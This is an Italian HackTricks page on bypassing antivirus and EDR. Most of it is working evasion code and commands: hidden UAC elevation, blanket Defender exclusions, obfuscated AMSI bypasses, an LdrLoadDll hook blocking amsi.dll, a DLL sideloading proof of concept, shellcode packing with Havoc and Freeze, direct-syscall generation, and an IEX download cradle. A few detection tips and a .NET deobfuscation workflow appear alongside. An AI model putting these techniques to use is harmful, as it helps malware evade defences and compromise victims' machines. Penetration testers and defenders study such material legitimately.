# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata inizialmente scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per fermare il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per fermare il funzionamento di Windows Defender fingendo di essere un altro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Bait UAC in stile installer prima di manomettere Defender

I loader pubblici che si mascherano da cheat per giochi spesso vengono distribuiti come installer Node.js/Nexe non firmati che prima **chiedono all'utente l'elevazione** e solo dopo disattivano Defender. Il flusso è semplice:

1. Verificare il contesto amministrativo con `net session`. Il comando riesce solo quando chi lo invoca ha i privilegi di admin, quindi un fallimento indica che il loader sta girando come utente standard.
2. Rilanciarsi immediatamente con il verbo `RunAs` per attivare il prompt UAC previsto, preservando la command line originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Le vittime già credono di star installando software “cracked”, quindi il prompt viene di solito accettato, dando al malware i diritti necessari per modificare la policy di Defender.

### Blanket `MpPreference` exclusions for every drive letter

Una volta elevati, i chain in stile GachiLoader massimizzano i blind spot di Defender invece di disabilitare direttamente il servizio. Il loader prima termina il watchdog della GUI (`taskkill /F /IM SecHealthUI.exe`) e poi imposta **esclusioni estremamente ampie** così che ogni profilo utente, directory di sistema e disco rimovibile diventi non scansionabile:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Osservazioni chiave:

- Il loop attraversa ogni filesystem montato (D:\, E:\, USB stick, ecc.), quindi **qualsiasi payload futuro rilasciato ovunque sul disco viene ignorato**.
- L’esclusione dell’estensione `.sys` è orientata al futuro: gli attaccanti si riservano la possibilità di caricare driver non firmati più avanti senza toccare di nuovo Defender.
- Tutte le modifiche finiscono sotto `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo alle fasi successive di verificare che le exclusion persistano o di ampliarle senza riattivare UAC.

Poiché nessun servizio di Defender viene fermato, i controlli di salute banali continuano a riportare “antivirus active” anche se l’ispezione in tempo reale non tocca mai quei percorsi.

## **AV Evasion Methodology**

Attualmente, gli AV usano metodi diversi per verificare se un file è malevolo o no, static detection, dynamic analysis, e per gli EDR più avanzati, behavioural analysis.

### **Static detection**

La static detection si ottiene segnalando stringhe note malevole o array di byte in un binario o script, ed estraendo anche informazioni dal file stesso (ad es. file description, company name, digital signatures, icon, checksum, ecc.). Questo significa che usare tool pubblici noti può farti beccare più facilmente, perché probabilmente sono già stati analizzati e segnalati come malevoli. Ci sono un paio di modi per aggirare questo tipo di detection:

- **Encryption**

Se cripti il binario, non ci sarà modo per l’AV di rilevare il tuo programma, ma avrai bisogno di qualche loader per decriptare ed eseguire il programma in memory.

- **Obfuscation**

A volte tutto ciò che devi fare è cambiare alcune stringhe nel binario o nello script per farlo passare oltre l’AV, ma può essere un compito lungo a seconda di ciò che stai cercando di offuscare.

- **Custom tooling**

Se sviluppi i tuoi tool, non ci saranno signature malevole note, ma richiede molto tempo ed effort.

> [!TIP]
> Un buon modo per verificare la static detection di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). In pratica divide il file in più segmenti e poi fa scansionare a Defender ciascuno di essi singolarmente; in questo modo, può dirti esattamente quali stringhe o byte sono segnalati nel tuo binario.

Ti consiglio vivamente di dare un’occhiata a questa [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sulla AV Evasion pratica.

### **Dynamic analysis**

La dynamic analysis è quando l’AV esegue il tuo binario in una sandbox e osserva attività malevole (ad es. provare a decriptare e leggere le password del tuo browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po’ più difficile da gestire, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sleep before execution** A seconda di come è implementato, può essere un ottimo modo per bypassare la dynamic analysis dell’AV. Gli AV hanno pochissimo tempo per scansionare i file per non interrompere il workflow dell’utente, quindi usare sleep lunghi può disturbare l’analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare lo sleep a seconda di come è implementato.
- **Checking machine's resources** Di solito le Sandbox hanno pochissime risorse disponibili (ad es. < 2GB RAM), altrimenti potrebbero rallentare la macchina dell’utente. Qui puoi anche essere molto creativo, per esempio controllando la temperatura della CPU o perfino la velocità delle ventole; non tutto verrà implementato nella sandbox.
- **Machine-specific checks** Se vuoi prendere di mira un utente il cui workstation è joinato al dominio "contoso.local", puoi fare un check del domain del computer per vedere se corrisponde a quello che hai specificato; se non corrisponde, puoi far uscire il tuo programma.

A quanto pare, il nome del computer nella Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il computer name nel tuo malware prima della detonazione; se il nome corrisponde a HAL9TH, significa che sei dentro la sandbox di Defender, quindi puoi far uscire il tuo programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per andare contro le Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come abbiamo detto prima in questo post, i **public tools** prima o poi **verranno rilevati**, quindi dovresti porti una domanda:

Per esempio, se vuoi fare dump di LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno conosciuto, che fa anche il dump di LSASS.

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei pezzi di malware più segnalati, se non il più segnalato, da AV ed EDR; mentre il progetto in sé è super cool, è anche un incubo da usare per aggirare gli AV, quindi cerca semplicemente alternative per ciò che stai cercando di ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per evasion, assicurati di **disattivare l’invio automatico dei sample** in Defender, e per favore, sul serio, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere evasion nel lungo periodo. Se vuoi verificare se il tuo payload viene rilevato da un AV specifico, installalo su una VM, prova a disattivare l’invio automatico dei sample e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Ogni volta che è possibile, dai sempre **priorità all’uso delle DLL per l’evasion**; per mia esperienza, i file DLL sono di solito **molto meno rilevati** e analizzati, quindi è un trucco molto semplice da usare per evitare la detection in alcuni casi (se il tuo payload ha ovviamente qualche modo per essere eseguito come DLL).

Come possiamo vedere in questa immagine, un payload DLL di Havoc ha un detection rate di 4/26 su antiscan.me, mentre il payload EXE ha un detection rate di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l’ordine di ricerca delle DLL usato dal loader posizionando vicini sia l’applicazione vittima sia il payload malevolo.

Puoi verificare quali programmi sono suscettibili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e il seguente script powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando restituirà l'elenco dei programmi suscettibili a DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che cercano di caricare.

Ti consiglio vivamente di **esplorare da solo i programmi DLL Hijackable/Sideloadable**, questa tecnica è piuttosto stealthy se eseguita correttamente, ma se usi programmi DLL Sideloadable noti pubblicamente, potresti essere scoperto facilmente.

Solo inserendo una DLL malevola con il nome che un programma si aspetta di caricare, non verrà caricato il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema, useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma effettua dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma ed essendo in grado di gestire l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: un template del codice sorgente DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un Detection rate di 0/26 in [antiscan.me](https://antiscan.me)! Lo considererei un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Consiglio **vivamente** di guardare il [VOD su twitch di S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per saperne di più su ciò che abbiamo discusso in modo più approfondito.

### Abusing Forwarded Exports (ForwardSideLoading)

I moduli Windows PE possono esportare funzioni che in realtà sono "forwarders": invece di puntare al codice, la voce di export contiene una stringa ASCII del tipo `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il Windows loader:

- Carica `TargetDll` se non è già caricato
- Risolve `TargetFunc` da esso

Comportamenti chiave da capire:
- Se `TargetDll` è una KnownDLL, viene fornito dal namespace protetto KnownDLLs (ad esempio ntdll, kernelbase, ole32).
- Se `TargetDll` non è una KnownDLL, viene usato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta eseguendo la forward resolution.

Questo abilita una primitive indiretta di sideloading: trovare una DLL firmata che esporta una funzione forwardata a un nome di modulo non-KnownDLL, poi collocare quella DLL firmata insieme a una DLL controllata dall'attaccante, chiamata esattamente come il modulo target forwardato. Quando la forwarded export viene invocata, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo la tua DllMain.

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite il normale ordine di ricerca.

PoC (copia-incolla):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Inserisci un `NCRYPTPROV.dll` malevolo nella stessa cartella. Un `DllMain` minimale è sufficiente per ottenere l’esecuzione del codice; non è necessario implementare la funzione inoltrata per attivare `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva il forward con un signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (firmato) carica la side-by-side `keyiso.dll` (firmato)
- أثناء la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader poi carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, otterrai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti di hunting:
- Concentrati su forwarded exports in cui il modulo di destinazione non è un KnownDLL. I KnownDLLs sono elencati sotto `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare i forwarded exports con tool come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Vedi l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Idee di detection/defense:
- Monitora i LOLBins (es. rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Genera un alert su catene di processo/modulo come: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` sotto percorsi scrivibili dall'utente
- Applica policy di code integrity (WDAC/AppLocker) e nega write+execute nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo stealthy.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasion è solo un gioco del gatto e del topo, ciò che funziona oggi potrebbe essere rilevato domani, quindi non affidarti mai a un solo tool; se possibile, prova a concatenare più tecniche di evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Gli EDR spesso inseriscono **user-mode inline hooks** sui syscall stub di `ntdll.dll`. Per bypassare questi hook, puoi generare syscall stub **direct** o **indirect** che caricano il corretto **SSN** (System Service Number) e passano alla kernel mode senza eseguire l'export entrypoint hookato.

**Opzioni di invocazione:**
- **Direct (embedded)**: emette un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (nessun hit all'export di `ntdll`).
- **Indirect**: salta dentro un esistente gadget `syscall` dentro `ntdll` così la transizione al kernel sembra originare da `ntdll` (utile per evasion euristica); **randomized indirect** sceglie un gadget da un pool per chiamata.
- **Egg-hunt**: evita di incorporare la sequenza opcode statica `0F 05` su disco; risolve una sequenza syscall a runtime.

**Strategie di risoluzione SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: inferisce gli SSN ordinando i syscall stub per virtual address invece di leggere i byte dello stub.
- **SyscallsFromDisk**: mappa un `\KnownDlls\ntdll.dll` pulito, legge gli SSN dal suo `.text`, poi fa unmap (aggira tutti gli hook in memoria).
- **RecycledGate**: combina l'inferenza SSN ordinata per VA con la validazione degli opcode quando uno stub è pulito; torna all'inferenza VA se è hookato.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e usa un VEH per catturare l'SSN da `EAX` a runtime, senza analizzare byte hookati.

Esempio di utilizzo di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado solo di scansionare **file su disco**, quindi se riuscivi in qualche modo a eseguire payload **direttamente in-memory**, l'AV non poteva fare nulla per impedirlo, perché non aveva abbastanza visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

- User Account Control, o UAC (elevation di EXE, COM, MSI, o installazione di ActiveX)
- PowerShell (script, uso interattivo, e valutazione di codice dinamico)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Office VBA macros

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendo il contenuto degli script in una forma sia non cifrata che non offuscata.

Eseguire `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente alert su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come antepone `amsi:` e poi il path dell'eseguibile da cui è stato eseguito lo script; in questo caso, powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati intercettati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene eseguito tramite AMSI. Questo influisce persino su `Assembly.Load(byte[])` per il caricamento di esecuzione in-memory. Ecco perché usare versioni più basse di .NET (come 4.7.2 o inferiori) è raccomandato per l'esecuzione in-memory se vuoi eludere AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI funziona principalmente con rilevamenti statici, modificare gli script che provi a caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI ha la capacità di deoffuscare gli script anche se hanno più livelli, quindi l'obfuscation potrebbe essere una cattiva opzione a seconda di come viene fatta. Questo rende l'elusione non così semplice. Anche se, a volte, tutto ciò che devi fare è cambiare un paio di nomi di variabili e andrà bene, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo di powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche eseguendo come utente non privilegiato. A causa di questo difetto nell'implementazione di AMSI, i ricercatori hanno trovato molteplici modi per eludere la scansione AMSI.

**Forcing an Error**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. In origine questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un uso più ampio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una sola riga di codice powershell per rendere AMSI inutilizzabile per il processo powershell corrente. Questa riga è stata naturalmente segnalata da AMSI stessa, quindi è necessaria una modifica per poter usare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che questo probabilmente verrà segnalato una volta che questo post uscirà, quindi non dovresti pubblicare alcun codice se il tuo piano è restare non rilevato.

**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverlo con istruzioni per restituire il codice per E_INVALIDARG; in questo modo, il risultato della scansione reale restituirà 0, che viene interpretato come un risultato pulito.

> [!TIP]
> Per una spiegazione più dettagliata, leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Esistono anche molte altre tecniche usate per bypassare AMSI con powershell, dai un'occhiata a [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più su di esse.

### Blocco di AMSI impedendo il caricamento di amsi.dll (hook LdrLoadDll)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto, indipendente dal linguaggio, consiste nel inserire un hook in user-mode su `ntdll!LdrLoadDll` che restituisce un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e non avviene alcuna scansione per quel processo.

Schema di implementazione (pseudocodice x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Funziona su PowerShell, WScript/CScript e custom loaders allo stesso modo (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all’invio di script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare lunghi artefatti nella command-line.
- Visto usare da loaders eseguiti tramite LOLBins (ad es. `regsvr32` che chiama `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remove the detected signature**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AV/EDR products that uses AMSI**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

Il logging di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per scopi di auditing e troubleshooting, ma può anche essere un **problema per gli attacker che vogliono eludere il rilevamento**.

Per bypassare il logging di PowerShell, puoi usare le seguenti tecniche:

- **Disabilitare PowerShell Transcription e Module Logging**: Puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) per questo scopo.
- **Usare Powershell version 2**: Se usi PowerShell version 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi fare così: `powershell.exe -version 2`
- **Usare una Powershell Session non gestita**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per avviare una powershell senza defenses (questo è ciò che usa `powerpick` di Cobal Strike).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Quando analizzi malware che usa ConfuserEx 2 (o fork commerciali) è comune trovarsi di fronte a diversi livelli di protezione che bloccano decompiler e sandbox. Il workflow qui sotto ripristina in modo affidabile **un IL quasi originale** che poi può essere decompilato in C# con tool come dnSpy o ILSpy.

1.  Rimozione anti-tampering – ConfuserEx cripta ogni *method body* e lo decripta dentro il costruttore statico del *module* (`<Module>.cctor`). Questo corregge anche il checksum PE, quindi qualsiasi modifica farà crashare il binary. Usa **AntiTamperKiller** per individuare le metadata tables criptate, recuperare le chiavi XOR e riscrivere una assembly pulita:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando costruisci un tuo unpacker.

2.  Recupero di simboli / control-flow – passa il file *clean* a **de4dot-cex** (un fork di de4dot consapevole di ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flag:
• `-p crx` – seleziona il profilo di ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà namespace, classi e nomi delle variabili originali e decripterà le stringhe costanti.

3.  Rimozione dei proxy-call – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (cioè *proxy calls*) per ostacolare ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti vedere API .NET normali come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binary risultante sotto dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il *real* payload. Spesso il malware lo memorizza come un byte array codificato TLV inizializzato dentro `<Module>.byte_0`.

La catena sopra ripristina il flusso di esecuzione **senza** dover eseguire il sample maligno – utile quando lavori su una workstation offline.

> 🛈  ConfuserEx produce un custom attribute chiamato `ConfusedByAttribute` che può essere usato come IOC per triagiare automaticamente i sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: offuscatore C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'obiettivo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di offrire una maggiore sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e protezione contro le manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare, in fase di compilazione, codice offuscato senza usare alcuno strumento esterno e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni offuscate generate dal framework di template metaprogramming di C++ che renderà la vita di chi vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un offuscatore binario x64 in grado di offuscare vari file pe diversi, inclusi: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di offuscamento del codice a granularità fine per linguaggi supportati da LLVM che usa ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando le normali istruzioni in catene ROP, ostacolando la nostra naturale concezione del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi alcuni eseguibili da internet ed esegui questi ultimi.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente malevole.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che applicazioni scaricate di rado attiveranno SmartScreen, avvisando e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è uno [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier che viene creato automaticamente quando si scaricano file da internet, insieme all'URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo dell'ADS Zone.Identifier per un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire che i tuoi payload ottengano il Mark of The Web è impacchettarli all'interno di qualche tipo di contenitore come un ISO. Questo accade perché il Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

